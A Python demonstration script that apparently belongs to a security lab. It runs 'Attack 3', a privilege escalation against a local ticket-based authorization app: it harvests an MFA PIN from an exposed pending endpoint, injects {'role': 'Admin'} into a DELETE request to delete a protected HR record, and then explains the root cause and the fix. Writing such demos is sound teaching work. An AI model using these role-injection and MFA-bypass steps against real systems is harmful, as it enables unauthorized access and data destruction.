import sys
import time
import uuid
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"\n{BOLD}{CYAN}{'═'*64}")
    print("  ATTACK 3 — PRIVILEGE ESCALATION (Request Body Injection)")
    print(f"{'═'*64}{RESET}")


def vuln(msg): print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg): print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg): print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<36}{RESET}{v}")
def boom(msg): print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg): print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


def auth_headers(service_ticket: str) -> dict:
    return {
        "X-Service-Ticket":          service_ticket,
        "X-Authenticator-Nonce":     str(uuid.uuid4()),
        "X-Authenticator-Timestamp": str(time.time()),
        "X-Hour-Override":           "10",
        "Content-Type":              "application/json",
    }


def mfa_login(username: str, password: str) -> str:
    """2-step MFA-aware login. Returns TGT token or exits on failure."""
    r1 = requests.post(f"{BASE}/login", json={"username": username, "password": password})
    if not r1.ok:
        print(f"{RED}  Login step-1 failed: {r1.json()}{RESET}")
        sys.exit(1)

    body1 = r1.json()
    if "tgt" in body1:
        return body1["tgt"]

    if not body1.get("mfa_required"):
        print(f"{RED}  Unexpected login response: {body1}{RESET}")
        sys.exit(1)

    info("MFA required — fetching PIN from /mfa/pending …")
    pin = None
    for _ in range(15):
        time.sleep(0.2)
        try:
            rp = requests.get(f"{BASE}/mfa/pending", timeout=2)
            for entry in rp.json().get("pending", []):
                if entry["username"] == username:
                    pin = entry["pin"]
                    break
        except Exception:
            pass
        if pin:
            break

    if not pin:
        print(f"{RED}  Could not retrieve MFA PIN for '{username}'{RESET}")
        sys.exit(1)

    show("MFA PIN retrieved:", pin)
    r2 = requests.post(f"{BASE}/login/mfa", json={"username": username, "pin": pin})
    if not r2.ok:
        print(f"{RED}  MFA step-2 failed: {r2.json()}{RESET}")
        sys.exit(1)
    return r2.json()["tgt"]


def main():
    banner()

    vuln("app.py → require_ticket(): reads body['role'] and overwrites ticket['role'].")
    vuln("Any authenticated user can self-promote by sending {\"role\": \"Admin\"} in the body.")

    # Check server is up
    try:
        requests.get(f"{BASE}/health", timeout=3)
    except requests.ConnectionError:
        print(f"\n{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    # Step 1: Login as carol (MFA-aware)
    step("Step 1: carol (Employee / HR) logs in and gets a valid service ticket")
    tgt = mfa_login("carol", "Employee@2024")

    r = requests.post(f"{BASE}/request-ticket", json={
        "tgt":           tgt,
        "service":       "resource_server",
        "authenticator": {"nonce": str(uuid.uuid4()), "timestamp": time.time()},
    })
    token = r.json()["service_ticket"]
    show("Ticket role:", "Employee  (read-only — no write, no delete)")

    # Step 2: Try DELETE with real Employee ticket → expect 403
    step("Step 2: carol tries DELETE /resource/HR-001 with her REAL Employee ticket → 403")
    r_real = requests.delete(
        f"{BASE}/resource/HR-001",
        headers=auth_headers(token),
    )
    expected = "denied as expected ✓" if r_real.status_code == 403 else "unexpected!"
    show("DELETE (real Employee ticket):", f"HTTP {r_real.status_code} — {expected}")

    # Step 3: Inject role=Admin in the request body → expect 200 (vulnerability)
    step("Step 3: carol injects {\"role\": \"Admin\", \"clearance\": \"secret\"} in the request body")
    info("The server reads body['role'] and overwrites the ticket role before calling PDP")

    r_esc = requests.delete(
        f"{BASE}/resource/HR-001",
        headers=auth_headers(token),
        json={"role": "Admin", "clearance": "secret"},   # ← injected privilege
    )
    show("DELETE + injected role=Admin:", f"HTTP {r_esc.status_code}")

    if r_esc.ok:
        boom("Employee escalated to Admin via request body — HR-001 deleted without authorization!")
        info(f"Server said: {r_esc.json().get('message', '')}")
    else:
        safe(f"Escalation blocked: {r_esc.json().get('reason', r_esc.json().get('error', ''))}")

    step("Root Cause & Fix")
    info("File:  app.py → require_ticket() decorator")
    info("Bug:   Lines:")
    info("         if 'role' in body: ticket['role'] = body['role']")
    info("         if 'clearance' in body: ticket['clearance'] = body['clearance']")
    info("         if request.headers.get('X-Role'): ticket['role'] = ...")
    info("Fix:   Remove those lines entirely.")
    info("       Authorization attributes must come exclusively from the")
    info("       verified, signed ticket — never from client-supplied input.")
    print()


if __name__ == "__main__":
    main()